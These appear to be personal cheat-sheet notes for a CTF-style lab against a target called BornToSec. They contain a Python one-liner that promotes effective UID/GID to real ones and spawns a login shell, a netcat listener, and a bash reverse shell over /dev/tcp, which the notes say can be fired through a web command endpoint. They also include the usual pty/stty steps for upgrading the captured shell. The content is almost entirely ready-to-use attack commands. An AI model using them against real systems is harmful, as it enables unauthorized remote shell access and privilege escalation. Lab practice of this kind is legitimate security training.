```bash
python -c '
import os, pwd, pty

u = os.geteuid()
g = os.getegid()
pw = pwd.getpwuid(u)

os.setregid(g, g)
os.setreuid(u, u)

os.environ["HOME"] = pw.pw_dir
os.environ["USER"] = pw.pw_name
os.environ["LOGNAME"] = pw.pw_name
os.environ["SHELL"] = pw.pw_shell
os.chdir(pw.pw_dir)

pty.spawn([pw.pw_shell, "-l"])'
```

```bash
# on Parrot:
nc -lvnp <LISTEN_PORT>

# on BornToSec, including through a /bin/sh web command endpoint:
bash -c 'bash -i >& /dev/tcp/<PARROT_IP>/<LISTEN_PORT> 0>&1'


# on Parrot:
python3 -c 'import pty;pty.spawn("/bin/bash")'

# press `Ctrl+z`
stty raw -echo
fg
echo $TERM

export TERM=screen
export SHELL=/bin/bash

# Now you can clear your screen!
reset
resize
```
